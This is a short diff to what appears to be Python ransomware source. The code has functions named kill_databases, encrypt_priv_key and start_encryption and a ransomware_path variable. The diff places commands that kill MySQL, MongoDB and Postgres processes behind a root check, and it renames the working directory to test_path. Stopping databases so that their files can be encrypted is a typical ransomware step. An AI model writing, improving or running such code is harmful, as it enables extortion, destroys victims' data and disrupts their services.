@@ -22,13 +22,14 @@ from Crypto.Cipher import PKCS1_OAEP
 
 
 def kill_databases():
-    mysql = 'mysqld stop; mysql.server stop'
-    mongo = 'service mongodb stop; /etc/init.d/mongodb stop'
-    postgres = 'pkill -u postgres; pkill postgres'
-    
-    os.system(mysql)
-    os.system(mongo)
-    os.system(postgres)
+    if(os.getuid() == 0):
+        mysql = 'mysqld stop; mysql.server stop'
+        mongo = 'service mongodb stop; /etc/init.d/mongodb stop'
+        postgres = 'pkill -u postgres; pkill postgres'
+        
+        os.system(mysql)
+        os.system(mongo)
+        os.system(postgres)
 
 
 def encrypt_priv_key(msg, key):
@@ -73,7 +74,7 @@ def start_encryption(files):
 
 def menu():
     try:
-        os.mkdir(variables.ransomware_path)
+        os.mkdir(variables.test_path)
     except OSError:
         pass
 
